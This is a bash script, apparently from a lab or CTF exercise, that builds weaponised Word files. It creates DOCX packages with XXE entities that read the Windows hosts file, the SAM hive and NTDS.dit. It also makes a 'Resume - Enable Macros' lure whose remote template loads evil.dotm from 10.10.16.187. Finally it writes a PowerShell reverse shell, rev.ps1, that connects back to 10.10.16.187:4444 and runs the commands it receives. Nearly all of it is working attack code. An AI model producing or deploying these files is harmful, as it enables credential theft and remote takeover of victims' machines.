#!/bin/bash

mkdir -p ~/office_exploit
cd ~/office_exploit

# ===== EXPLOIT_HOSTS =====
mkdir -p exploit_hosts/{_rels,word/_rels}

cat > 'exploit_hosts/[Content_Types].xml' << 'ENDOFFILE'
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
</Types>
ENDOFFILE

cat > 'exploit_hosts/_rels/.rels' << 'ENDOFFILE'
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
</Relationships>
ENDOFFILE

cat > 'exploit_hosts/word/document.xml' << 'ENDOFFILE'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts" >]>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>&xxe;</w:t></w:r></w:p></w:body></w:document>
ENDOFFILE

cat > 'exploit_hosts/word/_rels/document.xml.rels' << 'ENDOFFILE'
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
</Relationships>
ENDOFFILE

echo "[+] exploit_hosts created"

# ===== EXPLOIT_SAM =====
mkdir -p exploit_sam/{_rels,word/_rels}
cp exploit_hosts/[Content_Types].xml exploit_sam/
cp exploit_hosts/_rels/.rels exploit_sam/_rels/

cat > 'exploit_sam/word/document.xml' << 'ENDOFFILE'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/windows/system32/config/sam" >]>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>&xxe;</w:t></w:r></w:p></w:body></w:document>
ENDOFFILE

cp exploit_hosts/word/_rels/document.xml.rels exploit_sam/word/_rels/

echo "[+] exploit_sam created"

# ===== EXPLOIT_NTDS =====
mkdir -p exploit_ntds/{_rels,word/_rels}
cp exploit_hosts/[Content_Types].xml exploit_ntds/
cp exploit_hosts/_rels/.rels exploit_ntds/_rels/

cat > 'exploit_ntds/word/document.xml' << 'ENDOFFILE'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/windows/ntds/ntds.dit" >]>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>&xxe;</w:t></w:r></w:p></w:body></w:document>
ENDOFFILE

cp exploit_hosts/word/_rels/document.xml.rels exploit_ntds/word/_rels/

echo "[+] exploit_ntds created"

# ===== TEMPLATE_INJECTION =====
mkdir -p template_injection/{_rels,word/_rels}
cp exploit_hosts/[Content_Types].xml template_injection/
cp exploit_hosts/_rels/.rels template_injection/_rels/

cat > 'template_injection/word/document.xml' << 'ENDOFFILE'
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>Resume - Enable Macros</w:t></w:r></w:p></w:body></w:document>
ENDOFFILE

cat > 'template_injection/word/_rels/document.xml.rels' << 'ENDOFFILE'
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/template" Target="http://10.10.16.187:8000/evil.dotm"/>
</Relationships>
ENDOFFILE

echo "[+] template_injection created"

# ===== EVIL_DOTM =====
mkdir -p evil_dotm/{_rels,word/_rels}

cat > 'evil_dotm/[Content_Types].xml' << 'ENDOFFILE'
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.template.main+xml"/>
</Types>
ENDOFFILE

cat > 'evil_dotm/_rels/.rels' << 'ENDOFFILE'
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
</Relationships>
ENDOFFILE

cat > 'evil_dotm/word/document.xml' << 'ENDOFFILE'
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>Template</w:t></w:r></w:p></w:body></w:document>
ENDOFFILE

cat > 'evil_dotm/word/_rels/document.xml.rels' << 'ENDOFFILE'
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
</Relationships>
ENDOFFILE

echo "[+] evil_dotm created"

# ===== REV.PS1 =====
cat > rev.ps1 << 'ENDOFFILE'
$client = New-Object System.Net.Sockets.TCPClient("10.10.16.187",4444);
$stream = $client.GetStream();
[byte[]]$buffer = 0..65535|%{0};
while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){
  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer,0, $i);
  $sendback = (iex $data 2>&1 | Out-String );
  $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
  $stream.Write($sendbyte,0,$sendbyte.Length);
  $stream.Flush()
}
$client.Close()
ENDOFFILE

echo "[+] rev.ps1 created"

# ===== ZIP EVERYTHING =====
echo "[*] Zipping files..."
zip -r exploit_hosts.docx exploit_hosts/ > /dev/null 2>&1
zip -r exploit_sam.docx exploit_sam/ > /dev/null 2>&1
zip -r exploit_ntds.docx exploit_ntds/ > /dev/null 2>&1
zip -r template_injection.docx template_injection/ > /dev/null 2>&1
zip -r evil.dotm evil_dotm/ > /dev/null 2>&1

echo ""
echo "[+] ALL FILES CREATED SUCCESSFULLY!"
echo ""
ls -lh *.docx *.dotm *.ps1
